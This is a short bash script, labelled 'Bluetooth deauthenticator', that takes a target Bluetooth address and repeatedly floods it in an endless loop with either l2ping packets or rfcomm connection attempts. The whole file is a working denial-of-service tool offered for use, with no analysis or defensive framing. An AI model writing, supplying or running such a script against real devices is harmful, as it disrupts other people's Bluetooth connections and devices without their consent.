#!/bin/bash

version="v0.1.2-alpha";
target_addr="$1";
packet_size="$2";
attack_type="$3";

echo "Bluetooth deauthenticator $version";

if [[ $# != 3 ]];
then
	echo -e "Attack types:\n"\
			"\t1.) l2ping - Ping flood\n"\
			"\t2.) rfcomm - Connect flood\n\n"\
			"[i] Usage: $0 <target_addr> <packet_size> <attack_type>\n";
	exit 0;
fi

if [[ "$attack_type" == 1 ]];
then
	cmd="l2ping -i hci0 -s $packet_size -f $target_addr";
elif [[ "$attack_type" == 2 ]];
then
	cmd="rfcomm connect $target_addr 1 2>&1 >/dev/null";
fi

while true;
do
	echo "[+] Packet sent to $target_addr -- Packet size: $packet_size -- Attack type: $attack_type";
	$cmd &
	sleep .200;
done
